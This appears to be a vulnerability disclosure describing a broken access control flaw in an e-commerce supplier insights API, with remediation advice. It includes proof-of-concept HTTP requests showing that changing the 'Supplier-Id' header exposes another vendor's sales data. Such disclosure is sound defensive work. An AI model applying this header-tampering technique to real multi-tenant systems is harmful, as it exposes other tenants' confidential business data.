HIGH (CVSS 8.5) API Security & Multi-Tenant Isolation (BOLA) Target: Enterprise E-Commerce Platform

Broken Access Control in Supplier Insights API

Scope: POST /api/insights/business-dashboard/fetchProductsWithRecommendations
Status: Remediated & Verified

// 01. EXECUTIVE SUMMARY

During a security and QA assessment of an enterprise e-commerce supplier portal, a Broken Access Control vulnerability was identified in the business insights microservice. Authorization decisions relied exclusively on a client-controlled HTTP header (`Supplier-Id`). Authenticated suppliers could modify this header to access confidential sales metrics, product recommendations, and business intelligence belonging to competing vendors.

// 02. PROOF OF CONCEPT & REPRODUCTION FLOW

### 1. Baseline Authenticated Request An authenticated user transmits a valid request for their own supplier metrics: ```http POST /api/insights/business-dashboard/fetchProductsWithRecommendations HTTP/2 Host: supplier.[redacted-ecommerce].com Supplier-Id: 2784913 Cookie: connect.sid=[REDACTED_SESSION] Content-Type: application/json { "supplier_id": 2784913, "type": "all", "offset": 0, "sort_by": "ORDERS", "limit": 1 } ``` **Response:** HTTP 200 OK returning confidential metrics for supplier `2784913`. ### 2. Header Manipulation Flow Modifying only the `Supplier-Id` header while keeping the active session cookie unchanged: ```http POST /api/insights/business-dashboard/fetchProductsWithRecommendations HTTP/2 Host: supplier.[redacted-ecommerce].com Supplier-Id: 1042 Cookie: connect.sid=[REDACTED_SESSION] Content-Type: application/json { "supplier_id": 2784913, "type": "all", "offset": 0, "sort_by": "ORDERS", "limit": 1 } ``` **Response:** HTTP 200 OK returning sales metrics, product recommendations, and revenue insights belonging to victim supplier `1042`. ### 3. Validation Matrix - Modifying `supplier_id` inside JSON body only -> HTTP 403 Forbidden - Omitting `Supplier-Id` header -> HTTP 403 Forbidden - Modifying `Supplier-Id` header -> **HTTP 200 OK (Unauthorized Cross-Tenant Access)**

// 03. BUSINESS IMPACT & REGULATORY EXPOSURE

Complete breakdown of multi-tenant isolation across a multi-vendor marketplace. Enables automated large-scale competitor data scraping, private sales intelligence exposure, and severe financial/competitive harm.

// 04. REMEDIATION & QA ENGINEERING GUIDANCE

1. **Do Not Trust Client Headers:** Derive supplier and user identity strictly from the cryptographically verified server-side session or signed JWT claim. 2. **Session-to-Resource Binding:** Validate on the backend that `session.supplier_id == requested_supplier_id` prior to executing database queries. 3. **Automated Regression:** Add negative authorization assertions into automated CI/CD QA test suites (Postman/Newman).
